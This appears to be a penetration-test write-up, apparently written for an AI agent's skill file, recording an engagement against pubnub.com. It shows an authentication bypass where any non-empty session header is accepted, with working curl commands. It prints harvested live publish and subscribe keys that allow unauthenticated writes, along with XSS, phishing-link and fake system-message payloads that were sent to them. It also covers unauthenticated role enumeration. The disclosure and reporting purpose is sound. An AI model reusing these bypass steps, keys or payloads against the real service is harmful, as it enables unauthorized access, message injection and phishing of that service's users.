# Session middleware presence-check bypass, unauth keyset write, and unauth role enumeration

Worked example for `unauth-surface-discovery` §1n (rule 6), §1o and §1p. Target `pubnub.com`,
2026-10-31, continuation of the engagement recorded in `references/pubnub-2026-10-engagement.md`.
Same scope, same policy, same AI-disclosure requirement.

**Outcome of this round:** three further findings — an authentication bypass (§1o), an
unauthenticated write primitive on the messaging keysets (§1p), and unauthenticated enumeration
of the internal authorization-role catalogue (§1q). Plus a large, honestly recorded negative
matrix from the IDOR hunt.

---

## 1. The presence-check bypass (SKILL.md §1o)

`admin.pubnub.com` and `dashboard.pubnub.com` share a session middleware that treats **any
non-empty** `x-session-token` value as an authenticated session.

```
$ curl -s https://admin.pubnub.com/api/pinned-versions/available-versions
{"statusCode":401,"error":"Unauthorized","message":["Authentication required"]}

$ curl -s -H "x-session-token: a" https://admin.pubnub.com/api/pinned-versions/available-versions
{"versions":[{"name":"2026-10-27"},{"name":"2026-10-20"},{"name":"2026-10-14"}, ...]}
```

### Value matrix — proves it is a presence test

| value | result |
|---|---|
| `""` | 401 |
| `" "` | 401 |
| `"a"` | 200 |
| `"0"` | 200 |
| `"."` | 200 |
| `"p0ZZZGARBAGE"` | 200 |
| 300 × `"a"` | 200 |
| `{"a":1}` | 200 |
| `[1,2,3]` | 200 |

### Channel matrix — two code paths, both broken

| channel | result |
|---|---|
| `x-session-token: a` | 200 |
| `Cookie: __Host-PN-2-pnAdminToken=a` | 200 |
| `Cookie: pnAdminToken=a` | 401 |
| `Authorization: Bearer a` | 401 |
| `Authorization: Basic a` | 401 |
| `x-auth-token: a` | 401 |
| `x-pn-token: a` | 401 |

Both working names came from the SPA bundle's request layer — the same grep that yields the
`secure:!0` map. 34 names swept; exactly two worked.

### Route sweep — 96 ID-bearing routes, 8 changed behaviour

| route | no token | bypass | data? |
|---|---|---|---|
| `/api/pinned-versions/available-versions` | 401 | **200** | yes — version list |
| `/api/pinned-versions/changelog` | 401 | **200** | yes — 7,889-byte internal changelog |
| `/api/incident-notice` | 401 | **200** | yes — live incident state |
| `/api/oem/partner` | 401 | 400 | no — handler validation |
| `/api/oem/customers` | 401 | 400 | no — handler validation |
| `/api/oem/keysets` | 401 | 400 | no — handler validation |
| `/api/integrations` | 401 | 400 | no — handler validation |
| `/api/datasync/ui` | 401 | 400 | no — handler validation |

The 5 that reach a handler are the blast-radius argument: the middleware is the only gate, and any
future handler without its own authz check is exposed identically.

**Hosts affected:** `admin.pubnub.com`, `dashboard.pubnub.com`. Not `moderation-dashboard.`,
`mcp.`, `pn.`, `status.` (404 on both), `www.` (429).

### Horizontal-IDOR negative control (run this before claiming anything)

```python
seen = {}
for aid in ["627651", "1", "2", "100", "999999", "0"]:
    st, b, _ = req(B + "/api/pinned-versions/changelog?accountId=" + aid, hdr=T)
    seen[aid] = (st, len(b), md5(b).hexdigest())
# 1/6 distinct -> NOT account-scoped -> no horizontal IDOR
```

All six bodies were byte-identical (md5 `c81786972535…`), so the endpoints are not scoped to the
caller and there is no IDOR to claim. Stated explicitly in the report.

### The inverted oracle — a negative, not a finding

`/api/roles/list` returned **200 with no token** and **500 with any token** — the opposite polarity
to the bypass. That is a broken code path (see §3), not an auth signal. Recorded as a negative.

---

## 2. The unauth write primitive (SKILL.md §1p)

### Keyset provenance and the read/write asymmetry

| keyset | publish key | history read | publish |
|---|---|---|---|
| `sub-c-a15882e8-3185-11ec-bb3f-f27e7ede0273` | `pub-c-e087e539-bb0c-4d15-91c9-aa83a5e975f8` | 200 readable | 200 Sent |
| `sub-c-95fe09e0-64bb-4087-ab39-7b14659aab47` | `pub-c-c8d024f7-d239-47c3-9a7b-002f346c1849` | **403 blocked** | **200 Sent** |
| `sub-c-6c30d752-7eb3-11eb-bd5f-5e89866287f8` | `pub-c-6c0ded76-bf3d-48f8-by8e-8676a4cf7e1e` | 200 empty | timeout (inconclusive) |

Both keysets and both publish keys were harvested from
`https://moderation-dashboard.pubnub.com/static/js/main.2cc4fb85.chunk.js` and
`.../2.05c18b84.chunk.js`.

**Row 2 is the finding.** Access Manager is demonstrably configured on that keyset — its storage
read refuses anonymous callers with 403 — yet publish accepts them. That is an authorisation
omission, not a demo default, and it survives the "public subscribe key" argument.

### Body-shape trap (cost a false negative)

```
POST /publish/<pub>/<sub>/0/default/0   message=<json string>   -> 400 [0,"Invalid JSON",...]
POST /publish/<pub>/<sub>/0/default/0   raw JSON body           -> 200 [1,"Sent","17934167117245298"]
```

### 3x validation with read-back

| run | publish | verified in history |
|---|---|---|
| 1 | `200 [1,"Sent","17934167610322324"]` | yes |
| 2 | `200 [1,"Sent","17934167660586142"]` | yes |
| 3 | `200 [1,"Sent","17934167714275400"]` | yes |

### Scope measurements

- **Channels:** `default`, `general`, `admin`, `moderation`, and an invented channel name — all 200.
  No channel allowlist.
- **Rate:** 10/10 publishes in 10.5 s. No rate limiting.
- **Payload fidelity** (each read back verbatim):
  - `{"text":"<img src=x onerror=alert(1)>","type":"default"}`
  - `{"text":"click https://evil.example.com","type":"default"}`
  - `{"text":"x","extra":{"a":1},"type":"default"}` — extra field preserved
  - `{"text":"SYSTEM: your account has been suspended","type":"default"}`

### Controls that held (report as negatives)

| attempt | result |
|---|---|
| 32 KB message | `413` from the Balancer |
| 100 KB message | `413` |
| Publish as another user's UUID (path segment) | 200, but stored `uuid` comes back empty — cannot impersonate a specific existing user |
| History delete | `403` — requires Storage & Playback + Storage Delete |
| App Context write | `400` — "Could Not Parse Request" from Access Manager |
| `POST /v1/auth/grant` unsigned | `405` |
| `signal` endpoint | `404 Invalid URI` |

**CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` = 7.5 (High), tempered by the fact that XSS
execution and session hijack were not demonstrated.

---

## 3. Unauthenticated role enumeration (SKILL.md §1q)

`GET /api/roles/list` returns the complete internal authorization-role catalogue with no auth,
byte-stable 3x (md5 `98c43f72e8…`):

```json
{"1":"Account Admin","3":"App Admin","4":"App Viewer","5":"Key Admin","6":"Key Viewer",
 "10":"Functions Developer - for an App (Legacy v1)",
 "11":"Functions Developer - for a Keyset (Legacy v1)",
 "12":"Functions Operator - for an App (Legacy v1)",
 "13":"Functions Operator - for a Keyset (Legacy v1)",
 "14":"Functions Viewer - for an App (Legacy v1)",
 "15":"Functions Viewer - for Keyset (Legacy v1)",
 "18":"Bizops Objects Operator","21":"Functions developer","22":"Functions viewer",
 "26":"Account Viewer"}
```

**The inconsistency is the finding.** Siblings are correctly protected:

```
GET /api/roles/all   -> 401 {"code":401,"error":"Unauthorized"}
GET /api/roles/1     -> 401 {"code":401,"error":"Unauthorized"}
```

So `/list` was missed when authentication was applied, rather than being intentionally public.
The numeric IDs are the operationally useful part — they are the values the API uses internally to
express permissions.

**CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = 5.3 (Medium). Reconnaissance value, not direct
compromise; scored above Informational because it is complete, unauthenticated, stable, and
concerns the authorization model.

---

## 4. IDOR hunt — the negative matrix (do not re-test)

| surface | result |
|---|---|
| 96 ID-bearing admin routes, no-token vs bypass | 8 differentials, all in §1 above; 0 already-200 |
| `/api/pinned-versions/*`, `/api/incident-notice` with `?accountId=` 627651/1/2/100/999999/0 | byte-identical bodies — not account-scoped, no horizontal IDOR |
| `/api/subscription/accounts`, `/invoice/all`, `/payment/all`, `/legal-files/1/list` | 403 with and without the bypass — handler auth holds |
| `/api/bizops-dashboards/auto-moderation/{id}/metrics/all-for-channel` | 500 for every dashboard ID and every parameter — broken route, no stack trace, no data |
| `/api/datasync/ui` + 10 subpaths | uniform `400 DS-0002 Invalid request path` |
| `/api/oem/partner` GET with `accountId` int/0/-1/2^31/2^64/str/hex | 401 from the handler |
| `/api/oem/customers` POST with full valid body + permutations | 401 from the handler |
| `/api/oem/keysets` GET with `accountId`+`customerId` valid | 401 from the handler |
| `/api/integrations` POST with a fully valid scope object | 401 from the handler |
| App Context read by harvested UUID (9 users) | `400 Could Not Parse Request` — PAM blocks |
| App Context bulk enumeration `/v2/objects/<sub>/uuid` | `400 Could Not Parse Request` |
| Cross-keyset history read (2 other keysets × 5 channels) | 403 / empty |
| Message actions, files, push devices by ID | `400` / `[]` |
| F4 bypass × all 16 OAuth endpoints | **zero differential** — different infrastructure, the bypass does not carry |
| F4 bypass × F1 `/api/saml` and F2 `/api/health` | no differential; `redirect_url` differs only in SAML nonce/timestamp |
| F4 bypass on `ps.pndsn.com` | no differential (already public) |
| 500-endpoint stack-trace fishing (12 payload shapes) | always generic `Internal server error`, no stack/version/host |
| `/api/permissions`, `/api/scopes`, `/api/roles`, `/api/acl`, `/api/entitlements` | 404 |

**Useful by-product:** `/api/integrations` leaked its own validation schema before refusing —
`{"statusCode":400,...,"message":["scopes: is missing"]}` then
`["scopes: is required to have at least 1 items"]` then
`["scopes.0.resource_type must be one of the following values: account, keyset, app"]` then
`["scopes.0.resource_id is required when resource_type is account"]`. Four sequential 400s handed
over the complete internal scope model for free. That is the NotNull oracle (§2) applied to a
nested object — worth doing deliberately on any endpoint that answers 400 with field names.

---

## 5. Report hygiene notes from this round

- **One finding = one draft = one PDF.** F4, F6 and F7 were each staged as their own Gmail draft
  with their own PDF, per the discipline rule in SKILL.md.
- **Correct a claim in public rather than letting it stand.** The earlier history-read report
  (F5) went out as High with "real user chat history" when every provenance signal said demo
  keyset. The correction path is a follow-up that withdraws the claim, drops the severity, and
  asks the vendor to confirm whether the keyset is production or demo — not silence.
- **A generic 500 is not a finding.** The `all-for-channel` endpoint returned 500 for every input;
  that is a broken feature for the product channel, not a bounty report.
- **Verify the sent artefact, not the draft.** After sending, re-read the message by ID and
  confirm `labelIds` contains `SENT`, the PDF part is present with the right filename and byte
  size, and the body length matches. A "Message not a draft" error usually means it already went.
